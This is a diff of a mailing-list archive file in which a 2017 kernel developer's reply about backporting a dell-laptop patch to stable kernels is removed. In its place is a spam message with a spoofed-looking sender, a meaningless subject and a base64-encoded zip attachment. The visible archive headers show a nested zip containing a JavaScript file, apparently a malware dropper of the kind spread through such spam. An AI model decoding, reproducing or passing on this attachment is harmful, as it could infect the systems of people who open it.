@@ -1,92 +1,90 @@
-From: Darren Hart <dvhart@infradead.org>
-Subject: Re: [PATCH] dell-laptop: Adds support for keyboard backlight timeout
- AC settings
-Date: Wed, 26 Apr 2017 15:40:49 -0700
-Message-ID: <20170426224049.GB3879@fury>
-References: <1492976447-10339-1-git-send-email-pali.rohar@gmail.com>
- <CAHp75VfCiqeddWu9xfMud4sEWAvk+CDXTkgO5zbb++QhiTL=Bw@mail.gmail.com>
- <20170425125453.GK30553@pali>
- <CAHp75VdjZ4Ti1YPZVq8_fjUh0xuDbQ-EtZQQjaWQf2fhZs2mRw@mail.gmail.com>
- <20170425134044.GL30553@pali>
- <c140b70b460f45afa43bdfd7dec723b3@ausx13mpc120.AMER.DELL.COM>
- <e217a6c7-7c13-37bc-369a-cd464a5c6fbe@ivanov.biz>
+From: <wesley.sydnor@louisvillemsd.org>
+Subject: 2740 platform-driver-x86
+Date: Thu, 27 Apr 2017 12:34:52 -0000
+Message-ID: <149329649217.4258.10120521226733570036@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=iso-8859-1
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="46.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from bombadil.infradead.org ([65.50.211.133]:57529 "EHLO
-        bombadil.infradead.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1031883AbdDZWky (ORCPT
+Received: from 111-240-191-201.dynamic-ip.hinet.net ([111.240.191.201]:47678
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1031282AbdD0MfE (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Wed, 26 Apr 2017 18:40:54 -0400
-Content-Disposition: inline
-In-Reply-To: <e217a6c7-7c13-37bc-369a-cd464a5c6fbe@ivanov.biz>
+        Thu, 27 Apr 2017 08:35:04 -0400
+Content-Disposition: attachment
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: Arcadiy Ivanov <arcadiy@ivanov.biz>, Greg Kroah-Hartman <gregkh@linuxfoundation.org>
-Cc: Mario.Limonciello@dell.com, pali.rohar@gmail.com, andy.shevchenko@gmail.com, mjg59@srcf.ucam.org, andy@infradead.org, platform-driver-x86@vger.kernel.org, linux-kernel@vger.kernel.org
+To: platform-driver-x86@vger.kernel.org
 
-On Tue, Apr 25, 2017 at 05:50:57PM -0400, Arcadiy Ivanov wrote:
-> On 2017-04-25 09:49, Mario.Limonciello@dell.com wrote:
-> > > -----Original Message-----
-> > > From: Pali Rohár [mailto:pali.rohar@gmail.com]
-> > > Sent: Tuesday, April 25, 2017 8:41 AM
-> > > To: Andy Shevchenko <andy.shevchenko@gmail.com>
-> > > Cc: Matthew Garrett <mjg59@srcf.ucam.org>; Darren Hart
-> > > <dvhart@infradead.org>; Andy Shevchenko <andy@infradead.org>; Arcadiy Ivanov
-> > > <arcadiy@ivanov.biz>; Limonciello, Mario <Mario_Limonciello@Dell.com>;
-> > > Platform Driver <platform-driver-x86@vger.kernel.org>; linux-
-> > > kernel@vger.kernel.org
-> > > Subject: Re: [PATCH] dell-laptop: Adds support for keyboard backlight timeout AC
-> > > settings
-> > > 
-> > > On Tuesday 25 April 2017 16:32:36 Andy Shevchenko wrote:
-> > > > On Tue, Apr 25, 2017 at 3:54 PM, Pali Rohár <pali.rohar@gmail.com> wrote:
-> > > > > On Tuesday 25 April 2017 15:36:56 Andy Shevchenko wrote:
-> > > > > > On Sun, Apr 23, 2017 at 10:40 PM, Pali Rohár <pali.rohar@gmail.com> wrote:
-> > > > > > This patch misses few others that were applied to our testing / for-next.
-> > > > > Ah... sorry for that :-( And I was in impression that there were fixes
-> > > > > for that code which use mutexes... Now I know why I have not seen them!
-> > > > > 
-> > > > > > I have applied it to testing with corrected conflict (easy to fix),
-> > > > > > though check if everything still as supposed to be.
-> > > > > Can you send a link to your fix?
-> > > > Sure, here it is:
-> > > > http://git.infradead.org/linux-platform-drivers-
-> > > x86.git/commit/bcf7d8a30e2888f78a19778a16d3dd8c10b4b0ad
-> > > 
-> > > It is OK.
-> > > 
-> > Pali,
-> > 
-> > Considering this is negatively affecting folks on stable kernel releases too
-> > when using this newer HW, would you consider to send to @stable too?
-> > 
-> > Thanks,
-> 
-> I second that. Thanks!
-> 
-
-In order for this to go back to stable, we will need to include the list of
-dependencies per stable-kernel-rules.txt. This can be done after it is merged,
-but if you can provide the set of Cc: stable lines needed, we can look at
-getting this into testing now so no further action will be required.
-
-...
-
-Upon closer inspection, this does fail the 100 lines including context stable
-rule by an additional 55 lines. This is a process issue I've been thinking about
-for a while and trying to find the best way to express this problem and what a
-viable solution might look like. As it stands, fixes such as these are
-effectively limited to current and future kernel versions. I do think there is a
-need for vendors to be able to update their drivers upstream to work with current
-hardware without requiring a bleeding edge kernel. Perhaps "leaf node drivers"
-should have a looser set of stable rules, but that is not currently the way the
-upstream stable kernel rules work (at least as far as I understand them).
-
-+Greg KH who has the ultimate say on this. Greg, have I misrepresented anything
-here?
-
--- 
-Darren Hart
-VMware Open Source Technology Center
+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
